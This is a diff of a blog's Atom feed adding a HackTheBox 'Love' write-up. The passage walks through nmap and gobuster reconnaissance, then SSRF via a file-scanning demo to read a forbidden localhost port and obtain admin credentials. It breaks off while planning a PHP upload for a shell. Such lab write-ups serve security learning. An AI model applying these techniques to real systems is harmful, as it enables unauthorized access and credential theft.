@@ -4,7 +4,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en">
     <title type="text">Doomdesire</title>
     <subtitle type="html">MemE is a powerful and highly customizable GoHugo theme for personal blogs.</subtitle>
-    <updated>2021-07-24T19:03:55&#43;03:00</updated>
+    <updated>2021-08-07T22:13:28&#43;03:00</updated>
     <id>https://netuserdoomdesire.github.io/</id>
     <link rel="alternate" type="text/html" href="https://netuserdoomdesire.github.io/" />
     <link rel="self" type="application/atom&#43;xml" href="https://netuserdoomdesire.github.io/atom.xml" />
@@ -14,6 +14,401 @@
             </author>
     
     <generator uri="https://gohugo.io/" version="0.83.1">Hugo</generator>
+        <entry>
+            <title type="text">Love Writeup (HackTheBox)</title>
+            <link rel="alternate" type="text/html" href="https://netuserdoomdesire.github.io/posts/writeups/love/" />
+            <id>https://netuserdoomdesire.github.io/posts/writeups/love/</id>
+            <updated>2021-08-07T22:12:33&#43;03:00</updated>
+            <published>2021-08-07T10:00:00&#43;03:00</published>
+            <author>
+                    <name>Doomdesire</name>
+                    <uri>https://netuserdoomdesire.github.io/</uri>
+                    </author>
+            <summary type="html">Overview Machine: https://www.hackthebox.eu/home/machines/profile/344 Love is an easy HackTheBox Windows machine created by pwnmeow (https://www.hackthebox.eu/home/users/profile/157669). We begin by
+Initial Reconnaissance Port Scanning: We can start with the standard nmap, scanning all ports:
+1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79  nmap -sC -sV -p- 10.</summary>
+            
+                <content type="html">&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Love/1.png&#34; alt=&#34;Pasted image 20210803061156.png&#34;&gt;&lt;/p&gt;
+&lt;h1 id=&#34;overview&#34;&gt;Overview&lt;/h1&gt;
+&lt;p&gt;Machine: &lt;a href=&#34;https://www.hackthebox.eu/home/machines/profile/344&#34;&gt;https://www.hackthebox.eu/home/machines/profile/344&lt;/a&gt;
+Love is an easy HackTheBox Windows machine created by &lt;strong&gt;pwnmeow&lt;/strong&gt; (&lt;a href=&#34;https://www.hackthebox.eu/home/users/profile/157669)&#34;&gt;https://www.hackthebox.eu/home/users/profile/157669)&lt;/a&gt;. We begin by&lt;/p&gt;
+&lt;h1 id=&#34;initial-reconnaissance&#34;&gt;Initial Reconnaissance&lt;/h1&gt;
+&lt;h3 id=&#34;port-scanning&#34;&gt;Port Scanning:&lt;/h3&gt;
+&lt;p&gt;We can start with the standard nmap, scanning all ports:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;54
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;55
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;56
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;57
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;58
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;59
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;60
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;61
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;62
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;63
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;64
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;65
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;66
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;67
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;68
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;69
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;70
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;71
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;72
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;73
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;74
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;75
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;76
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;77
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;78
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;79
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;nmap -sC -sV -p- 10.10.10.239 -oA Love
+Starting Nmap 7.91 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at 2021-08-03 06:09 EDT
+Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.239
+Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.080s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
+Not shown: &lt;span class=&#34;m&#34;&gt;65516&lt;/span&gt; closed ports
+PORT      STATE SERVICE      VERSION
+80/tcp    open  http         Apache httpd 2.4.46 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;Win64&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; OpenSSL/1.1.1j PHP/7.3.27&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; http-cookie-flags: 
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   /: 
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     PHPSESSID: 
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_      httponly flag not &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Apache/2.4.46 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Win64&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; OpenSSL/1.1.1j PHP/7.3.27
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Voting System using PHP
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+443/tcp   open  ssl/http     Apache httpd 2.4.46 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;OpenSSL/1.1.1j PHP/7.3.27&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Apache/2.4.46 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Win64&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; OpenSSL/1.1.1j PHP/7.3.27
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: &lt;span class=&#34;m&#34;&gt;403&lt;/span&gt; Forbidden
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssl-cert: Subject: &lt;span class=&#34;nv&#34;&gt;commonName&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;staging.love.htb/organizationName&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;ValentineCorp/stateOrProvinceName&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;m/countryName&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;in
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Not valid before: 2021-01-18T14:00:16
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_Not valid after:  2022-01-18T14:00:16
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_ssl-date: TLS randomness does not represent &lt;span class=&#34;nb&#34;&gt;time&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; tls-alpn: 
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  http/1.1
+445/tcp   open  microsoft-ds Windows &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt; Pro &lt;span class=&#34;m&#34;&gt;19042&lt;/span&gt; microsoft-ds &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;workgroup: WORKGROUP&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+3306/tcp  open  mysql?
+5000/tcp  open  http         Apache httpd 2.4.46 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;OpenSSL/1.1.1j PHP/7.3.27&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Apache/2.4.46 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Win64&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; OpenSSL/1.1.1j PHP/7.3.27
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: &lt;span class=&#34;m&#34;&gt;403&lt;/span&gt; Forbidden
+5040/tcp  open  unknown
+5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SSDP/UPnP&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Microsoft-HTTPAPI/2.0
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Not Found
+5986/tcp  open  ssl/http     Microsoft HTTPAPI httpd 2.0 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SSDP/UPnP&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Microsoft-HTTPAPI/2.0
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Not Found
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssl-cert: Subject: &lt;span class=&#34;nv&#34;&gt;commonName&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;LOVE
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Subject Alternative Name: DNS:LOVE, DNS:Love
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Not valid before: 2021-04-11T14:39:19
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_Not valid after:  2024-04-10T14:39:19
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_ssl-date: 2021-08-03T10:44:06+00:00&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; +29m16s from scanner time.
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; tls-alpn: 
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  http/1.1
+7680/tcp  open  pando-pub?
+47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SSDP/UPnP&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Microsoft-HTTPAPI/2.0
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Not Found
+49664/tcp open  msrpc        Microsoft Windows RPC
+49665/tcp open  msrpc        Microsoft Windows RPC
+49666/tcp open  msrpc        Microsoft Windows RPC
+49667/tcp open  msrpc        Microsoft Windows RPC
+49668/tcp open  msrpc        Microsoft Windows RPC
+49669/tcp open  msrpc        Microsoft Windows RPC
+49670/tcp open  msrpc        Microsoft Windows RPC
+Service Info: Hosts: www.example.com, LOVE, www.love.htb&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; OS: Windows&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_clock-skew: mean: 2h14m16s, deviation: 3h30m01s, median: 29m15s
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; smb-os-discovery: 
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   OS: Windows &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt; Pro &lt;span class=&#34;m&#34;&gt;19042&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Windows &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt; Pro 6.3&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   OS CPE: cpe:/o:microsoft:windows_10::-
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   Computer name: Love
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   NetBIOS computer name: LOVE&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;00&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   Workgroup: WORKGROUP&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;00&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  System time: 2021-08-03T03:43:53-07:00
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; smb-security-mode: 
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   account_used: &amp;lt;blank&amp;gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   authentication_level: user
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   challenge_response: supported
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  message_signing: disabled &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;dangerous, but default&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; smb2-security-mode: 
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   2.02: 
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_    Message signing enabled but not required
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; smb2-time: 
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   date: 2021-08-03T10:43:51
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap &lt;span class=&#34;k&#34;&gt;done&lt;/span&gt;: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; IP address &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; host up&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; scanned in 328.65 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h3 id=&#34;flags-used&#34;&gt;Flags used:&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;-sC: Scan with the default scripts&lt;/li&gt;
+&lt;li&gt;-sV: Probe open ports to determine service/version info.&lt;/li&gt;
+&lt;li&gt;-p-: Scan the entire port range.&lt;/li&gt;
+&lt;li&gt;-oA: Save the nmap output on the designated file in all available formats.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h1 id=&#34;methodology&#34;&gt;Methodology&lt;/h1&gt;
+&lt;p&gt;From this machine&amp;rsquo;s nmap output, it could be easy to get lost since a lot of ports are open. That is because more ports open generally mean more opportunities for exploitation. However it could also mean more false positives that could end up wasting our time. Especially in the context of HackTheBox boxes, so many ports on an easy machine definitely mean that they are there to just confuse us. What we should be doing is take it step by step, starting by the HTTP/HTTPS servers. These are on ports 80, 443, 5000. In our case only port 80 and 443 are going to give us the info we need to continue, since the server on port 5000 forbids us from accessing it:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Love/11.png&#34; alt=&#34;Pasted image 20210803072734.png&#34;&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;h1 id=&#34;port-80443&#34;&gt;Port 80/443&lt;/h1&gt;
+&lt;p&gt;Navigating to the http://10.10.10.239 we get the following:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Love/2.png&#34; alt=&#34;Pasted image 20210803061622.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;This appears to be a voting system that requires valid credentials in order to log in. Something to note is that it uses php, something we can confirm from the &lt;strong&gt;Wappalyzer&lt;/strong&gt; Firefox plugin, the server&amp;rsquo;s title or if we visit &lt;strong&gt;http://10.10.10.239/index.php&lt;/strong&gt;. We also start our &lt;strong&gt;gobuster&lt;/strong&gt; with:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;gobuster dir -u http://10.10.10.239 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;The &lt;strong&gt;-x&lt;/strong&gt; argument is going to help us identify files and not only folders on the server. Our file choice can vary, however we only search for &lt;strong&gt;.txt&lt;/strong&gt; and &lt;strong&gt;.php&lt;/strong&gt; files since we identified that the server uses php. Looking at it&amp;rsquo;s results, we see that a &lt;strong&gt;/admin&lt;/strong&gt; folder exists. Visiting &lt;strong&gt;http://10.10.10.239/admin/&lt;/strong&gt; we see the following:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Love/4.png&#34; alt=&#34;Pasted image 20210803064531.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;While similar to the previous login page, this appears to be the page that the admin is going to log in from, while the previous was just for the voters. At this point we have no credentials, no further findings from gobuster and no other vulnerability identified whatsoever, so we move on to port 443. Visiting &lt;strong&gt;https://10.10.10.239&lt;/strong&gt; we get the following:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Love/3.png&#34; alt=&#34;Pasted image 20210803063511.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;While we can&amp;rsquo;t view the page, since this is HTTPS, we can view the &lt;strong&gt;certificate&lt;/strong&gt; in order to identify any leaked information. Clicking at the top left of the page and selecting to view the certificate we get the following information:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Love/5.png&#34; alt=&#34;Pasted image 20210803065321.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;This is very valuable information for us since we get the following:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;An email address as well as a username.&lt;/li&gt;
+&lt;li&gt;The domain of the target.&lt;/li&gt;
+&lt;li&gt;A subdomain that may provide us with a new page.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;It should be noted that the nmap scan had already identified for us the domain name as well the subdomain on the port 443 results, using the same method we did (inspecting the certificate), however it is good practice to manually test things, so it was showcased here. Since we have learned that the target&amp;rsquo;s domain is &lt;strong&gt;love.htb&lt;/strong&gt; and that the subdomain &lt;strong&gt;staging.love.htb&lt;/strong&gt; also exists, we are going to enter them on our &lt;strong&gt;/etc/hosts&lt;/strong&gt; file:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Love/6.png&#34; alt=&#34;Pasted image 20210803070346.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Visiting &lt;strong&gt;&lt;a href=&#34;http://love.htb&#34;&gt;http://love.htb&lt;/a&gt;&lt;/strong&gt; directs us to the already seen voting system page. However, visiting &lt;strong&gt;&lt;a href=&#34;http://staging.love.htb&#34;&gt;http://staging.love.htb&lt;/a&gt;&lt;/strong&gt; page directs us to a new page:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Love/7.png&#34; alt=&#34;Pasted image 20210803070810.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;This appears to be used as a page used to scan visitor&amp;rsquo;s files for recognized malware signatures. It seems that it is still in beta testing and we can not sign up for it, however we can try it by clicking on the &amp;ldquo;&lt;strong&gt;Demo&lt;/strong&gt;&amp;rdquo; link on the top left:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Love/8.png&#34; alt=&#34;Pasted image 20210803070854.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Here we have to enter the URL of a file and it will scan it for us. To test it, we will start a simple python server on our machine and try to scan a file on our machine. In this case i will scan the nmap output file:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Love/9.png&#34; alt=&#34;Pasted image 20210803071724.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Further testing this, we try to scan the target itself:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Love/10.png&#34; alt=&#34;Pasted image 20210803072049.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;At this point we know we can request resources. The next step would be to test the same thing, but by using the localhost IP address:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Love/12.png&#34; alt=&#34;Pasted image 20210803073126.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;This also works! This points to an SSRF vulnerability. Since we were able to read the &lt;strong&gt;http://10.10.10.239/&lt;/strong&gt; page from the tool, what we could try to do is to read the page hosted on the other open port we found earlier. On port &lt;strong&gt;5000&lt;/strong&gt; we had a &amp;ldquo;&lt;strong&gt;Forbidden&lt;/strong&gt;&amp;rdquo; error. Scanning the following URL through the tool:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;http://10.10.10.239:5000&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;brought the same results (Forbidden). However since we identified an SSRF vulnerability, maybe the following scan will have different results:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;http://127.0.0.1:5000&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Indeed, scanning http://127.0.0.1:5000, no longer brings the forbidden error and instead brings the following:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Love/14.png&#34; alt=&#34;Pasted image 20210803075146.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;While this is quite an unrealistic way to obtain credentials, it is a very good example to show how &lt;strong&gt;SSRF&lt;/strong&gt; let us read something we were forbidden to.&lt;/p&gt;
+&lt;p&gt;Since we now have admin credentials, as well as the admin page we previously found on &lt;strong&gt;http://10.10.10.239/admin/&lt;/strong&gt; we can now log in:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Love/15.png&#34; alt=&#34;Pasted image 20210803080650.png&#34;&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;h1 id=&#34;getting-a-shell-as-phoebe&#34;&gt;Getting a shell as phoebe&lt;/h1&gt;
+&lt;p&gt;In General when we log in to platforms like this, what we want to look for, is any way that we can upload files and maybe execute them. What we know about this particular server is that it uses php, so if we manage to upload and execute php we have our shell. Clicking around the plattform&amp;rsquo;s categories seems to bring no interesting results. When we try all the links, what is left is the &amp;ldquo;&lt;strong&gt;Update Profile&lt;/strong&gt;&amp;rdquo; feature:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Love/16.png&#34; alt=&#34;Pasted image 20210805144755.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Clicking on it, we get the following page, where we can change various information of the user:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Love/17.png&#34; alt=&#34;Pasted image 20210805144840.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Having in mind what we said earlier about being able to upload files, the interesting choice here is obvious. First things first we try uploading an actual image to see if and how this works. Our test image will be a .png file randomly found on the internet:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Love/18.png&#34; alt=&#34;Pasted image 20210805145351.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Uploading and saving our change seems to be sucessful!:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Love/19.png&#34; alt=&#34;Pasted image 20210805145520.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Since we can upload files, we now have two missions:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Find where the server saves this image.&lt;/li&gt;
+&lt;li&gt;Try to upload a .php file instead of an image file and execute it from the path we identified from the previous step.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;The first mission is quite easy, since we can just right click on the profile image and select &amp;ldquo;&lt;strong&gt;View Image&lt;/strong&gt;&amp;quot;:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Love/20.png&#34; alt=&#34;Pasted image 20210805145835.png&#34;&gt;&lt;/p&gt;
